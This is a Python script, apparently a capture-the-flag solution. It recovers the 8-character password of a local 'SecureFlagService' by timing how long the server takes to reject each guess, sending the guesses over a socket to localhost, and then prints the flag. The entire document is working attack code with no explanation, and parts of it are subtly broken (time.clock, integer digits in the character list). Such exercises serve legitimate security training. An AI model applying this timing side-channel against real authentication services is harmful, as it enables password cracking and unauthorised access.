import socket, os, time

BUFF_SIZE = 10000
SIZE = 1000


# list of A-Z + a-z + 0-9
list = []
for x in range(65,91):
    list.append(chr(x))
for x in range(97,123):
    list.append(chr(x))
for x in range(0,10):
    list.append(x)

# open server
os.startfile("SecureFlagService.exe")
pas = ""

for x in range(1,9):
    max_t = 0
    sign = None
    for y in list:
    
        # fill * if password < 8
        str1 = str(pas + y)
        if len(str1) < 8:
            for i in range(8 - len(str1)):
                str1 = str1 + '*'
            
        # f1: accept password and return response time & flag
        flag = "f"
    
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)   # declare socket
        s.connect(('127.0.0.1', 1234))                          # connect to server
        s.recv(BUFF_SIZE)                                       # enter password
        s.send(bytes(str1, 'utf8'))                              # send current password
        t1 = int(round(time.clock() * SIZE))
    
        data = s.recv(BUFF_SIZE)
        data = data.decode('utf8')
        t2 = int(round(time.clock() * SIZE))
    
        if data == "f":
            while len(data) != 0:
                data = s.recv(BUFF_SIZE)
                flag += data.decode('utf8')
            print("Flag: " + flag)
        s.close()
        
        t = t2 - t1
        
        if t > max_t:
            max_t = t
            sign = y
        if data != 'f':
            print("Password: " + pas + y)
    pas += sign

